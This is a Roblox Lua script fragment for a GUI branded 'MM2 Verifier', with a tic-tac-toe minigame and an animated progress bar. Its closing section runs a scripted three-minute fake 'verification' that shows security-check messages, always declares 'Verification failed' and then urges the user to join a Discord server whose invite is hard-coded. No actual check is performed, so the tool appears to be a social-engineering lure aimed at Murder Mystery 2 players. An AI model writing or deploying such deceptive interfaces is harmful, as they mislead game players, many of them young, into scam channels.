    BackgroundColor3 = Color3.fromRGB(214, 226, 236), BorderSizePixel = 0, ClipsDescendants = true, ZIndex = 7
})
corner(BarBg, 4)
local BarFill = frame(BarBg, {Size = UDim2.new(0, 0, 1, 0), BackgroundColor3 = C.white, BorderSizePixel = 0, ClipsDescendants = true, ZIndex = 8})
corner(BarFill, 4)
local barGrad = new("UIGradient", BarFill, {Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.mint), ColorSequenceKeypoint.new(0.5, C.sky), ColorSequenceKeypoint.new(1, C.lilac)})})
local Sheen = frame(BarFill, {Size = UDim2.new(0.25, 0, 1, 0), Position = UDim2.new(-0.3, 0, 0, 0), BackgroundColor3 = C.white, BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = 9})
new("UIGradient", Sheen, {Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5, 0.2), NumberSequenceKeypoint.new(1, 1)})})
table.insert(anim.fns, function(t) if Sheen.Parent then Sheen.Position = UDim2.new(((t * 0.55) % 1.5) - 0.3, 0, 0, 0) end end)

-- Minigame header
label(Panel, {
    Size = UDim2.new(0.62, 0, 0, 20), Position = UDim2.fromOffset(15, 136), BackgroundTransparency = 1,
    Text = "Tic-Tac-Toe Minigame", TextColor3 = C.deep, TextSize = 11, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
})
local ScoreLbl = label(Panel, {
    Size = UDim2.new(0.38, -15, 0, 20), Position = UDim2.new(0.62, 0, 0, 136), BackgroundTransparency = 1,
    Text = "W 0   L 0   D 0", TextColor3 = C.muted, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Right, ZIndex = 6
})
local GameStatus = label(Panel, {
    Size = UDim2.new(1, -30, 0, 16), Position = UDim2.fromOffset(15, 156), BackgroundTransparency = 1,
    Text = "You = ✕    Bot = ○", TextColor3 = C.aqua, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
})
local Grid = frame(Panel, {Size = UDim2.fromOffset(302, 190), Position = UDim2.fromOffset(14, 178), BackgroundTransparency = 1, ZIndex = 5})
new("UIGridLayout", Grid, {CellSize = UDim2.fromOffset(94, 58), CellPadding = UDim2.fromOffset(10, 8), SortOrder = Enum.SortOrder.LayoutOrder})
local ResultLbl = label(Panel, {
    Size = UDim2.new(1, -28, 0, 20), Position = UDim2.fromOffset(14, 374), BackgroundTransparency = 1,
    Text = "", TextColor3 = C.success, TextSize = 11, Font = Enum.Font.GothamMedium, TextTransparency = 1, ZIndex = 6
})
addAlert(Panel, UDim2.fromOffset(14, 398), UDim2.new(1, -28, 0, 80))
local DiscordBtn = glassButton(Panel, "Copy Discord invite", UDim2.new(1, -28, 0, 36), UDim2.fromOffset(14, 488))
local CopyStatus = label(Panel, {
    Size = UDim2.new(1, -28, 0, 14), Position = UDim2.fromOffset(14, 530), BackgroundTransparency = 1,
    Text = "Murder Mystery 2  •  discord.gg/KnRMYe7Kn", TextColor3 = C.muted, TextSize = 9, Font = Enum.Font.Gotham, ZIndex = 7
})
DiscordBtn.MouseButton1Click:Connect(function() copyDiscord(CopyStatus) end)

-- ── Tic-Tac-Toe (Minimax + alpha-beta, logic unchanged) ──
local board, cells, gameOver, playerTurn = {}, {}, false, true
local wins, losses, draws = 0, 0, 0
local CE = Color3.fromRGB(244, 250, 252)
local CX = Color3.fromRGB(86, 150, 160)
local CO = Color3.fromRGB(138, 126, 190)
local TINT_X = Color3.fromRGB(214, 240, 232)
local TINT_O = Color3.fromRGB(230, 224, 246)
for i = 1, 9 do
    board[i] = ""
    local b = new("TextButton", Grid, {
        LayoutOrder = i, Size = UDim2.fromOffset(94, 58), BackgroundColor3 = CE, BackgroundTransparency = 0.1,
        BorderSizePixel = 0, Text = "", TextSize = 22, Font = Enum.Font.GothamMedium, AutoButtonColor = false, ZIndex = 6
    })
    corner(b, 10)
    stroke(b, C.white, 1, 0.1)
    pressFx(b)
    b.MouseEnter:Connect(function()
        if board[i] == "" and not gameOver and playerTurn then tw(b, {BackgroundColor3 = C.aquaLight}, 0.12) end
    end)
    b.MouseLeave:Connect(function()
        if board[i] == "" then tw(b, {BackgroundColor3 = CE}, 0.12) end
    end)
    cells[i] = b
end

local WINS = {{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}}
local function checkWin(b, m) for _, w in ipairs(WINS) do if b[w[1]] == m and b[w[2]] == m and b[w[3]] == m then return true end end end
local function winLine(b, m) for _, w in ipairs(WINS) do if b[w[1]] == m and b[w[2]] == m and b[w[3]] == m then return w end end end
local function full(b) for i = 1, 9 do if b[i] == "" then return false end end return true end

local function minimax(b, d, isMax, a, be)
    if checkWin(b, "O") then return 10 - d end
    if checkWin(b, "X") then return d - 10 end
    if full(b) then return 0 end
    if isMax then
        local best = -math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "O" local s = minimax(b, d + 1, false, a, be) b[i] = "" best = math.max(best, s) a = math.max(a, best) if be <= a then break end end end
        return best
    else
        local best = math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "X" local s = minimax(b, d + 1, true, a, be) b[i] = "" best = math.min(best, s) be = math.min(be, best) if be <= a then break end end end
        return best
    end
end

local function bestMove()
    local bs, mv = -math.huge, nil
    for i = 1, 9 do if board[i] == "" then board[i] = "O" local s = minimax(board, 0, false, -math.huge, math.huge) board[i] = "" if s > bs then bs = s mv = i end end end
    return mv
end

local function updateScore() ScoreLbl.Text = "W " .. wins .. "   L " .. losses .. "   D " .. draws end
local function flash(txt, col)
    ResultLbl.Text = txt ResultLbl.TextColor3 = col ResultLbl.TextTransparency = 1
    tw(ResultLbl, {TextTransparency = 0}, 0.3)
    task.delay(2.5, function() if ResultLbl.Parent then tw(ResultLbl, {TextTransparency = 1}, 0.4) end end)
end
local function highlight(line, col)
    if not line then return end
    for _, idx in ipairs(line) do
        tw(cells[idx], {BackgroundColor3 = col}, 0.25)
        local sc = cells[idx]:FindFirstChildOfClass("UIScale")
        if sc then tw(sc, {Scale = 1.07}, 0.18) task.delay(0.22, function() if sc.Parent then tw(sc, {Scale = 1}, 0.35, Enum.EasingStyle.Back) end end) end
    end
end
local function setCell(i, m)
    board[i] = m cells[i].Text = m == "X" and "✕" or "○" cells[i].TextColor3 = m == "X" and CX or CO
    cells[i].TextSize = 4
    tw(cells[i], {TextSize = 22, BackgroundColor3 = m == "X" and TINT_X or TINT_O}, 0.3, Enum.EasingStyle.Back)
end
local function resetGame()
    task.wait(1.4)
    if not SG.Parent then return end
    for i = 1, 9 do board[i] = "" cells[i].Text = "" tw(cells[i], {BackgroundColor3 = CE}, 0.25) end
    gameOver = false playerTurn = true
    GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
end
local function botPlay()
    playerTurn = false GameStatus.Text = "Bot is thinking..." GameStatus.TextColor3 = CO
    task.delay(0.45, function()
        if gameOver or not SG.Parent then return end
        local m = bestMove()
        if m then setCell(m, "O")
            if checkWin(board, "O") then gameOver = true losses = losses + 1 updateScore() highlight(winLine(board, "O"), C.lilac) flash("Bot wins! Play again?", CO) resetGame() return end
            if full(board) then gameOver = true draws = draws + 1 updateScore() flash("It's a draw! Play again?", C.muted) resetGame() return end
        end
        playerTurn = true GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
    end)
end
for i = 1, 9 do
    cells[i].MouseButton1Click:Connect(function()
        if gameOver or board[i] ~= "" or not playerTurn then return end
        setCell(i, "X")
        if checkWin(board, "X") then gameOver = true wins = wins + 1 updateScore() highlight(winLine(board, "X"), C.butter) flash("You win! Play again?", C.success) resetGame() return end
        if full(board) then gameOver = true draws = draws + 1 updateScore() flash("It's a draw! Play again?", C.muted) resetGame() return end
        botPlay()
    end)
end
GameStatus.Text = "Your turn — tap a cell"

-- ── Mini pill (hidden state) ──
local Pill = glassButton(SG, "MM2 Verifier", UDim2.fromOffset(122, 30), UDim2.fromOffset(10, 60), 8)
Pill.Name = "Pill"
Pill.Visible = false
corner(Pill, 15)
auroraStroke(Pill, 1.4, 0.1)
table.insert(anim.fns, function(t) if Pill.Parent then Pill.BackgroundTransparency = 0.02 + (math.sin(t * 1.6) + 1) / 2 * 0.12 end end)
local pDrag, pDragStart, pStartPos = false
Pill.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        pDrag = true pDragStart = i.Position pStartPos = Pill.Position
    end
end)
Pill.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDrag = false end
end)
local dragConn = UIS.InputChanged:Connect(function(i)
    if pDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - pDragStart
        Pill.Position = UDim2.fromOffset(pStartPos.X.Offset + d.X, pStartPos.Y.Offset + d.Y)
    end
end)

local function showPanel()
    Pill.Visible = false
    tw(panelScale, {Scale = 1}, 0.45, Enum.EasingStyle.Back)
    tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end
local function hidePanel()
    tw(panelScale, {Scale = 0.92}, 0.3)
    tw(Panel, {Position = UDim2.fromOffset(-350, 60)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.delay(0.4, function() if SG.Parent then Pill.Visible = true end end)
end
HideBtn.MouseButton1Click:Connect(hidePanel)
CloseBtn.MouseButton1Click:Connect(function() SG:Destroy() end)
Pill.MouseButton1Click:Connect(showPanel)

-- Entrance: slide + scale pop
tw(panelScale, {Scale = 1}, 0.6, Enum.EasingStyle.Back)
tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

-- ── 3-minute verification loop → failed → Discord support ──
local MSGS = {
    "Verifying that you are not a bot...",
    "Almost there...",
    "Running security checks...",
    "Testing your connection...",
    "Analyzing gameplay patterns...",
    "Cross-referencing your account...",
    "Checking integrity, please wait...",
    "Finalizing verification..."
}
local startT = tick()
local msgIdx = 1
local lastSwap = tick()
local animConn = RunService.Heartbeat:Connect(step)
local conn
conn = RunService.Heartbeat:Connect(function()
    local e = tick() - startT
    local p = math.min(e / LOAD_DUR, 1)
    BarFill.Size = UDim2.new(p, 0, 1, 0)
    if p < 1 and tick() - lastSwap >= 30 then
        lastSwap = tick()
        msgIdx = (msgIdx % #MSGS) + 1
        tw(StatusLbl, {TextTransparency = 1}, 0.25)
        tw(VerificationTitle, {TextTransparency = 1}, 0.25)
        task.delay(0.3, function()
            if StatusLbl.Parent then
                VerificationTitle.Text = MSGS[msgIdx]
                tw(StatusLbl, {TextTransparency = 0}, 0.25)
                tw(VerificationTitle, {TextTransparency = 0}, 0.25)
            end
        end)
    end
    if p >= 1 then
        conn:Disconnect()
        gameOver = true
        VerificationTitle.Text = "Verification failed"
        VerificationTitle.TextColor3 = C.error
        StatusLbl.Text = "Please join our Discord server for further assistance."
        StatusLbl.TextColor3 = C.warning
        barGrad.Color = ColorSequence.new(C.peach, C.error)
        tw(Dot, {BackgroundColor3 = C.error}, 0.5)
        tw(DotHalo, {BackgroundColor3 = C.peach}, 0.5)
        CopyStatus.Text = "Please join our Discord server for further assistance."
        CopyStatus.TextColor3 = C.warning
        local sc = DiscordBtn:FindFirstChildOfClass("UIScale")
        table.insert(anim.fns, function(t) if sc and sc.Parent then sc.Scale = 1 + math.sin(t * 4) * 0.02 end end)
        tw(DiscordBtn, {BackgroundTransparency = 0}, 0.25)
    end
end)
SG.Destroying:Connect(function()
    if conn and conn.Connected then conn:Disconnect() end
    if animConn and animConn.Connected then animConn:Disconnect() end
    if dragConn and dragConn.Connected then dragConn:Disconnect() end
end)
